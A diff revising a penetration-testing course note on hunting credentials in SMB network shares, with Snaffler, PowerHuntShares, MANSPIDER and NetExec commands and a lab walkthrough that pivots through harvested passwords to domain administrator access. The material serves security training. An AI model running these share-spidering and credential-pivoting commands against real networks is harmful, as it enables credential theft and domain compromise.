@@ -1,12 +1,12 @@
-# 🔑 Credential Hunting in Network Shares
+# Credential Hunting in Network Shares
 
 > **Module Section:** 19 / 26 — Password Attacks
 
 ## Overview
 
-Nearly all corporate environments include **network shares** used by employees to store and share files across teams. While essential, they can unintentionally become a **goldmine for attackers** — especially when sensitive data like plaintext credentials or configuration files are left behind.
+Almost every company uses network shares. Employees store files on them and access them from any computer on the network. This is convenient — but dangerous. Config files, scripts, and install files often contain plaintext passwords. Attackers hunt these shares after gaining initial access.
 
-This section covers how to hunt for credentials across network shares from both **Windows** and **Linux** systems using common tools and techniques attackers use to uncover hidden secrets.
+This section shows how to find credentials in network shares from both **Windows** and **Linux** systems.
 
 ---
 
@@ -25,30 +25,32 @@ Before using specialized tools, understand the **patterns and file formats** tha
 
 ### Strategic Tips
 
-- 🌍 **Localize keywords** — Attacking a German company? Search for `Benutzer` instead of `User`
-- 🎯 **Be strategic with shares** — Scanning 10 shares with thousands of files takes significant time
-- 💼 **Prioritize IT shares** over company photos or marketing shares
-- 🔍 **Start simple** — Begin with command-line searches before scaling to automated tools
+- **Localize keywords** — Attacking a German company? Search for `Benutzer` instead of `User`
+- **Be strategic with shares** — Scanning 10 shares with thousands of files takes significant time
+- **Prioritize IT shares** over company photos or marketing shares
+- **Start simple** — Begin with command-line searches before scaling to automated tools
 
 ### Quick PowerShell Search
 
 ```powershell
 Get-ChildItem -Recurse -Include *.ext \\Server\Share | Select-String -Pattern "passw"
 ```
+> Searches all files on a UNC share that match the extension for the string "passw". Swap `*.ext` for `*.ps1,*.txt,*.ini` and change the pattern to match your target keyword.
 
 ---
 
 ## Hunting from Windows
 
-### 🛠 Snaffler
+### Snaffler
 
-A **C# program** that, when run on a domain-joined machine, automatically identifies accessible network shares and searches for interesting files.
+Snaffler is a C# program. Run it on a domain-joined machine and it auto-discovers accessible network shares, then searches them for interesting files. It color-codes results so you can spot credentials at a glance.
 
 #### Basic Usage
 
 ```cmd
 c:\Users\Public>Snaffler.exe -s
 ```
+> Runs Snaffler on the current domain-joined machine. It finds accessible shares, downloads interesting files, and color-codes results. Add `-o snaffler.log` to save output to a file.
 
 #### Example Output Highlights
 
@@ -66,10 +68,10 @@ c:\Users\Public>Snaffler.exe -s
 
 | Color | Meaning |
 |-------|---------|
-| 🟢 **Green** | Accessible share (R = Read) |
-| 🔴 **Red** | High-value finding (e.g., passwords) |
-| 🟡 **Yellow** | Medium-interest file (e.g., disk images) |
-| ⚫ **Black** | No access |
+| Green | Accessible share (R = Read) |
+| Red | High-value finding (e.g., passwords) |
+| Yellow | Medium-interest file (e.g., disk images) |
+| Black | No access |
 
 #### Useful Parameters
 
@@ -80,52 +82,47 @@ c:\Users\Public>Snaffler.exe -s
 | `-i` | **Include** specific shares in the search |
 | `-n` | Exclude specific shares |
 
-> ⚠️ **Manual review required** — Snaffler (and all these tools) generates large output with many false positives.
+> Manual review is always required. All these tools produce large output with many false positives.
 
 ---
 
-### 🛠 PowerHuntShares
+### PowerHuntShares
 
-A **PowerShell script** that doesn't require a domain-joined machine. Its killer feature: generates an **HTML report** with an easy-to-review UI.
+PowerHuntShares is a PowerShell script. It does not need a domain-joined machine. Its best feature is the HTML report it generates — easy to browse and share with a team.
 
 #### Report Example
 
-Summary shows findings categorized as:
-- 🔴 Critical
-- 🟠 High
-- 🟡 Medium
-- 🟢 Low
-
-Plus: **Interesting**, **Sensitive**, and **Secrets** file categories.
+The summary categorizes findings as Critical, High, Medium, or Low. It also groups files into **Interesting**, **Sensitive**, and **Secrets** categories.
 
 #### Basic Usage
 
 ```powershell
 PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
 ```
+> Runs PowerHuntShares with 100 parallel threads and saves the HTML and CSV report to the specified folder. Increase `-Threads` on fast networks; lower it on slow ones.
 
 #### What It Automates
 
-- ✅ Determines current computer's domain
-- ✅ Enumerates domain computers
-- ✅ Checks ping responses
-- ✅ Filters for TCP 445 open and accessible
-- ✅ Enumerates SMB shares and permissions
-- ✅ Identifies shares with **excessive privileges**
-- ✅ Identifies **high-risk** shares
-- ✅ Enumerates common share owners, names, directory listings
-- ✅ Generates last-written and last-accessed timelines
-- ✅ Produces HTML summary + detailed CSV files
+- Determines the current computer's domain
+- Enumerates domain computers
+- Checks ping responses
+- Filters for TCP 445 open and accessible
+- Enumerates SMB shares and permissions
+- Identifies shares with excessive privileges
+- Identifies high-risk shares
+- Enumerates share owners, names, and directory listings
+- Generates last-written and last-accessed timelines
+- Produces HTML summary and detailed CSV files
 
-> ⏱ Can take **hours** to run in large environments.
+> Can take hours to run in large environments.
 
 ---
 
 ## Hunting from Linux
 
-### 🛠 MANSPIDER
+### MANSPIDER
 
-Scan SMB shares **remotely from Linux** — no domain-joined computer needed. Best run via the **official Docker container** to avoid dependency issues.
+MANSPIDER scans SMB shares remotely from Linux. You do not need a domain-joined computer. Run it via the official Docker container to avoid dependency problems.
 
 #### Basic Content Search
 
@@ -133,6 +130,7 @@ Scan SMB shares **remotely from Linux** — no domain-joined computer needed. Be
 docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider \
   10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
 ```
+> Runs MANSPIDER via Docker against the target host. `-c` sets the content pattern to search for. `-u` and `-p` provide credentials. Matching files are downloaded to the loot directory mounted at `/root/.manspider`.
 
 #### Key Output
 
@@ -153,13 +151,13 @@ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider \
 | `-p` | Password |
 | `-v` | Volume mount for loot storage |
 
-> 📥 **Matching files are automatically downloaded** to the loot directory for offline review.
+> Matching files are downloaded automatically to the loot directory for offline review.
 
 ---
 
-### 🛠 NetExec (`nxc`)
+### NetExec (`nxc`)
 
-In addition to its many other uses, NetExec can **spider network shares** using the `--spider` option.
+NetExec has many uses. One of them is spidering network shares with the `--spider` option. It is fast and integrates well into existing Active Directory workflows.
 
 #### Basic Usage
 
@@ -167,6 +165,7 @@ In addition to its many other uses, NetExec can **spider network shares** using 
 nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' \
     --spider IT --content --pattern "passw"
 ```
+> Spiders the IT share on the target, scanning file contents for the pattern "passw". `--content` enables content search (not just filenames). Change `--pattern` to any keyword you want.
 
 #### Example Output
 
@@ -264,6 +263,7 @@ This lab uses **decoy generators** (`IT\Admin\*.ps1`) that plant fake credential
 ```bash
 nxc smb 10.129.234.173 -u mendres -p 'Inlanefreight2025!' --shares
 ```
+> Lists all SMB shares on the target and shows what permissions the user has on each one. Look for READ access to non-default shares like IT, HR, and Company.
 
 `mendres` has READ on: Company, HR, IT, NETLOGON, SYSVOL.
 
@@ -276,6 +276,7 @@ for s in HR IT Company; do
       --spider "$s" --content --pattern "passw"
 done
 ```
+> Loops through three shares and spiders each one for files containing "passw". Running them in a loop saves time versus three separate commands.
 
 Filter the noise: ignore `IT\Tools\nishang-master\*`, `PowerSploit-master\*`, and uniform-size decoys. The real hit is the size outlier:
 
@@ -290,6 +291,7 @@ smbclient //10.129.234.173/IT -U 'inlanefreight.local\mendres%Inlanefreight2025!
   -c 'cd Tools; get split_tunnel.txt'
 cat 'Tools\split_tunnel.txt'
 ```
+> Connects to the IT share with smbclient and downloads the target file. The `-c` flag passes commands directly without an interactive session. Note: smbclient saves files with literal backslashes in the name on Linux, so quote the path when reading it.
 
 ```
 Old settings for legacy VPN deployment:
@@ -309,6 +311,7 @@ Old settings for legacy VPN deployment:
 nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###'           # confirms valid
 nxc smb 10.129.234.173 -u jbader -p 'ILovePower333###' --shares
 ```
+> First command confirms the credential works (look for a green "+" in the output). Second command re-enumerates shares with the new user to find what additional access they have.
 
 `jbader` has **READ,WRITE** on Company, Finance, **HR**, IT, **Marketing**, **Sales** — note the newly accessible shares; that's where the next secret lives.
 
@@ -321,6 +324,7 @@ for s in HR IT Finance Marketing Sales Company; do
       --spider "$s" --content --pattern "passw"
 done
 ```
+> Same spider loop as Step 2, now using jbader's credentials. This reaches newly accessible shares like Finance, Marketing, Sales, and HR\Confidential that were denied to mendres.
 
 Two high-value hits stand out (not in `Tools\` and not uniform-size decoys):
 
@@ -340,6 +344,7 @@ smbclient //10.129.234.173/HR -U 'inlanefreight.local\jbader%ILovePower333###' \
 
 cat Onboarding_Docs_132.txt
 ```
+> First smbclient command bulk-downloads all files from IT\Admin using `recurse ON` and `mget *`. Second command downloads the specific HR file. `prompt OFF` suppresses the per-file confirmation prompt.
 
 The onboarding doc reveals the answer:
 
@@ -361,16 +366,17 @@ Account credentials
 nxc smb 10.129.234.173 -u Administrator -p 'Str0ng_Adm1nistrat0r_P@ssword_2025!'
 # Expect (Pwn3d!) marker — full domain compromise
 ```
+> Validates the Domain Administrator credential. A `(Pwn3d!)` marker in the output confirms local admin access, which on a DC means full domain compromise.
 
-### 📝 Lessons Learned
+### Lessons Learned
 
-1. **NetExec `--spider --content --pattern` beats Snaffler/PowerHuntShares on this lab** — PowerHuntShares only matches filenames; Snaffler drowns in nishang/PowerSploit noise.
-2. **Look for size outliers**, not just keyword hits. A `passw` match in a 113-byte filler file is decoy; a `passw` match in a 224-byte file in an otherwise uniform share is gold.
-3. **Real creds live in trailing `NOTE:` / `# Auth backup:` blocks**, not inline `username=/password=` pairs (those are bait).
-4. **Re-enumerate shares after every credential pivot** — newly accessible shares (Finance, Marketing, Sales, HR\Confidential) are where the next secret lives.
-5. **Read the decoy generators** (`IT\Admin\*.ps1`) once you have access — they enumerate every fake credential planted in the lab, saving you from chasing each one.
-6. **Files with `.docx`/`.pdf` extensions may actually be plaintext** — always `cat` first, don't reflexively `unzip`.
-7. **`smbclient` saves files with literal `\` in filenames on Linux** — quote them: `cat 'Tools\split_tunnel.txt'`.
+1. **NetExec `--spider --content --pattern`** beats Snaffler and PowerHuntShares on this lab. PowerHuntShares only matches filenames. Snaffler drowns in nishang and PowerSploit noise.
+2. **Look for size outliers**, not just keyword hits. A "passw" match in a 113-byte filler file is a decoy. A match in a 224-byte file in an otherwise uniform share is real.
+3. **Real credentials appear in trailing comment blocks** like `NOTE:` or `# Auth backup:`. Inline `username=/password=` pairs are usually bait.
+4. **Re-enumerate shares after every credential pivot.** Newly accessible shares are where the next secret lives.
+5. **Read the decoy generator scripts** (`IT\Admin\*.ps1`) once you have access. They list every fake credential planted in the lab.
+6. **Files with `.docx` or `.pdf` extensions may actually be plaintext.** Always `cat` them first before trying to unzip.
+7. **smbclient saves files with literal backslashes in filenames on Linux.** Quote the path when reading: `cat 'Tools\split_tunnel.txt'`.
 
 ---
 
